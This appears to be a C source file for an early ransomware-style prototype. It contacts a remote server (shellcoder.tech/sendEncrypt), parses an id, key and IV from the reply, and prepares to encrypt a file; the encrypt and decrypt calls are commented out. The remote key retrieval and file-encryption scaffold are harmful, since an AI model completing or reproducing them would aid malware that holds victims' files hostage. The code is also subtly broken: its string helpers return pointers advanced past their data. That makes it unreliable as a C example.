#include <stdio.h>
#include "encrypt.h"
#include <openssl/evp.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/stat.h>
#include <stdio.h>
#include <openssl/aes.h>
#include <curl/curl.h>

struct string {
  char *ptr;
  size_t len;
};


void init_string(struct string *s) {
  s->len = 0;
  s->ptr = malloc(s->len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "malloc() failed\n");
    exit(EXIT_FAILURE);
  }
  s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
  size_t new_len = s->len + size*nmemb;
  s->ptr = realloc(s->ptr, new_len+1);
  if (s->ptr == NULL) {
    fprintf(stderr, "realloc() failed\n");
    exit(EXIT_FAILURE);
  }
  memcpy(s->ptr+s->len, ptr, size*nmemb);
  s->ptr[new_len] = '\0';
  s->len = new_len;

  return size*nmemb;
}

char * _strncpy(char * string, int start, int end){
	char * return_val = malloc(sizeof(char) *(end-start+1));
	int i = 0;
	printf("Starting _strncpy\n");

	for (i = start; i < end; i ++)
	{
		printf("%c",string[i]);
		*return_val = string[i];
		*return_val++;
	}
	
	*return_val = '\0';

	printf("\nreturn val: %s\n",return_val);
	return return_val;

}

//returns id, key, iv
char ** parseJson(char * string, int len) 
{
	printf("%s\n\n",string);
	int i = 0, counted =0;
	char ** return_val = malloc(sizeof(char*)*3);

	for(i = 4; i < len; i ++)
	{
		if(counted == 2) {
			break;
		}
		if(string[i] == ':')
		{
			i = i + 2;
			printf("%d",string[i]);
			int j = i;
			while(string[j] != '"') {
				j++;
			}
			counted ++;
			*return_val = _strncpy(string,i,j);
			printf("return_val : %s\n",*return_val);
			*return_val++;
		}
	}
	printf("\n========================\n");
	return return_val;

}
int main (int argc, char ** argv) 
{
	if (argc != 2)
	{
		printf("[-] pass in file");
	}

	CURL *curl;
	CURLcode res;
	struct string s;
	init_string(&s);

	curl = curl_easy_init();
	if(curl) {
		curl_easy_setopt(curl, CURLOPT_URL, "http://shellcoder.tech/sendEncrypt");
		curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
		//curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);

		/* Perform the request, res will get the return code */ 
		res = curl_easy_perform(curl);

		/* Check for errors */ 
		if(res != CURLE_OK)
			fprintf(stderr, "curl_easy_perform() failed: %s\n",
		   curl_easy_strerror(res));


		printf("%s\n", s.ptr);
		char ** parsedResponse = parseJson(s.ptr,s.len);
		free(s.ptr);
		printf("%s\n",parsedResponse[0]);

		curl_easy_cleanup(curl);
	}

	unsigned char * key = (unsigned char *)"01234567890123456789012345678901";

	unsigned char *iv = (unsigned char *)"01234567890123456";

	printf("[-] Encrypting Now\n");
	//encrypt("plaintext.txt",key,iv);
	printf("[-] Encryption finished\n");

	//decrypt("plaintext.txt",key,iv);
	printf("Decryption finished\n");
	return 1;
}

